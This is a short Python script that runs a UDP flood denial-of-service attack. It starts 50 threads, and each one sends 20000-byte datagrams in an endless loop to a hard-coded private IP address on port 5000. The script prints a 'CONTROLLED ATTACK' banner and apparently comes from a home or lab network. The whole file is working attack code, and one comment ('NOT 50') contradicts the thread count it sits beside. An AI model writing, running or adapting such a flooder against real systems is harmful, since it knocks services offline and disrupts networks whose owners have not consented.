import socket
import threading
import time

target_ip = "192.168.29.151"
target_port = 5000

print("🚨 CONTROLLED ATTACK STARTED")

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"A" * 20000, (target_ip, target_port))
        except:
            pass

# 🔥 Reduced threads (stable)
threads = []

for i in range(50):   # NOT 50
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()
    threads.append(t)

while True:
    time.sleep(1)